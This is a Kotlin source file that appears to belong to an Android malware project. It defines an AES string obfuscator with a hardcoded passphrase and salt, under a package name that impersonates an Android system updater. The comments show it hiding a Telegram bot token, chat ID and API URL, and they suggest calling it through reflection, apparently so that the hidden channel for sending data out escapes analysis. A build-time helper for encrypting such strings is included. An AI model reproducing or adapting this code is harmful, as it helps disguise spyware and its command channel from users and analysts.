package com.android.systemui.updater.util

import java.security.SecureRandom
import java.util.Base64
import javax.crypto.Cipher
import javax.crypto.SecretKey
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

/**
 * Obfuscator provides AES-256 string encryption/decryption using a statically derived key.
 *
 * The secret key is derived from a hardcoded passphrase via PBKDF2 (with a fixed salt and
 * iteration count). Each encryption uses a randomly generated IV, which is prepended to the
 * ciphertext. Output format: Base64(IV || ciphertext).
 *
 * This design is reflection-friendly — methods are static (Kotlin `object`) and can be invoked
 * via `Class.forName("com.android.systemui.updater.util.Obfuscator").getMethod("decrypt", ...)`.
 *
 * Storage pattern in app:
 *   class Config {
 *     companion object {
 *         private const val ENC_BOT_TOKEN = "BASE64_STRING"
 *     }
 *     fun getToken(): String = Obfuscator.decrypt(ENC_BOT_TOKEN)
 *   }
 */
object Obfuscator {

    // Configuration (customize if needed)
    private const val PASSPHRASE = "SystemUI_Updater_Key_2025"
    private val SALT = byteArrayOf(
        0x12.toByte(), 0x34.toByte(), 0x56.toByte(), 0x78.toByte(),
        0x9A.toByte(), 0xBC.toByte(), 0xDE.toByte(), 0xF0.toByte()
    )
    private const val ITERATIONS = 10000
    private const val KEY_SIZE = 256 // bits
    private const val IV_SIZE = 16   // bytes for AES CBC
    private const val TRANSFORMATION = "AES/CBC/PKCS5Padding"

    private val cipher: Cipher by lazy { Cipher.getInstance(TRANSFORMATION) }
    private val keyFactory: SecretKeyFactory by lazy { SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256") }

    // Derived static AES key
    private val secretKey: SecretKey by lazy {
        val spec = PBEKeySpec(PASSPHRASE.toCharArray(), SALT, ITERATIONS, KEY_SIZE)
        val keyBytes = keyFactory.generateSecret(spec).encoded
        SecretKeySpec(keyBytes, "AES")
    }

    /**
     * Encrypts a plain string with AES-256-CBC using a random IV.
     *
     * @param plain clear-text input
     * @return Base64(IV || ciphertext)
     */
    fun encrypt(plain: String): String {
        val iv = ByteArray(IV_SIZE).also { SecureRandom().nextBytes(it) }
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, IvParameterSpec(iv))
        val cipherBytes = cipher.doFinal(plain.toByteArray(Charsets.UTF_8))
        val combined = iv + cipherBytes
        return Base64.getEncoder().encodeToString(combined)
    }

    /**
     * Decrypts a Base64(IV || ciphertext) string produced by [encrypt].
     *
     * @param encryptedBase64 Base64(IV || ciphertext)
     * @return original clear-text
     * @throws IllegalArgumentException on decryption failure (bad key, corrupted data)
     */
    fun decrypt(encryptedBase64: String): String {
        val combined = Base64.getDecoder().decode(encryptedBase64)
        require(combined.size > IV_SIZE) { "Input too short — missing IV or ciphertext" }
        val iv = combined.copyOfRange(0, IV_SIZE)
        val cipherBytes = combined.copyOfRange(IV_SIZE, combined.size)
        cipher.init(Cipher.DECRYPT_MODE, secretKey, IvParameterSpec(iv))
        val plainBytes = cipher.doFinal(cipherBytes)
        return String(plainBytes, Charsets.UTF_8)
    }
}

// --- Build-time encryption helper ---
// Compile this file into a standalone JAR to encrypt strings outside the Android app:
//
//   kotlinc Obfuscator.kt -include-runtime -d obfuscator.jar
//   java -jar obfuscator.jar
//
// Or create a separate Kotlin file with a `main` that calls Obfuscator.encrypt().
// The tool prints the encrypted Base64 value ready to be pasted into code.
//
// Example output:
//   Enter plain text to encrypt:
//   123456:ABC-DEF1234ghIkl
//   Encrypted Base64 (copy into code): "MIIEpQIBAAKCAQEA1a..."
//
// Storage example (Companion object):
//
// class TelegramConfig {
//     companion object {
//         private const val ENC_BOT_TOKEN = "MIIEpQIBAAKCAQEA1a..."
//         private const val ENC_CHAT_ID = "MIIEpQIBAAKCAQEA9b..."
//         private const val ENC_API_URL = "MIIEpQIBAAKCAQEAx8..."
//     }
//
//     val botToken: String get() = Obfuscator.decrypt(ENC_BOT_TOKEN)
//     val chatId: String get() = Obfuscator.decrypt(ENC_CHAT_ID)
//     val apiUrl: String get() = Obfuscator.decrypt(ENC_API_URL)
// }
//
// Reflection-friendly invocation (optional):
//   val clazz = Class.forName("com.android.systemui.updater.util.Obfuscator")
//   val decrypt = clazz.getMethod("decrypt", String::class.java)
//   val token = decrypt.invoke(null, ENC_BOT_TOKEN) as String
//
// Notes:
//  - This is obfuscation, not bulletproof encryption. A determined attacker can
//    recover the hardcoded passphrase and salt from the bytecode. For stronger
//    protection, consider NDK-based obscurity or Android Keystore.
//  - Encrypted values survive APK packing; Base64 is safe for embedding in Kotlin strings.

/**
 * Standalone build-time encryption helper.
 *
 * Usage:
 *   kotlinc Obfuscator.kt -include-runtime -d obfuscator.jar
 *   java -jar obfuscator.jar
 *
 * Or as a Kotlin script: kotlin Obfuscator.kt
 */
fun main() {
    println("Enter plain text to encrypt:")
    val input = readLine() ?: return
    val encrypted = Obfuscator.encrypt(input)
    println("Encrypted Base64 (copy into code): \"$encrypted\"")
    // Verification
    val decrypted = Obfuscator.decrypt(encrypted)
    check(decrypted == input) { "Round-trip verification failed!" }
    println("Verification successful.")
}
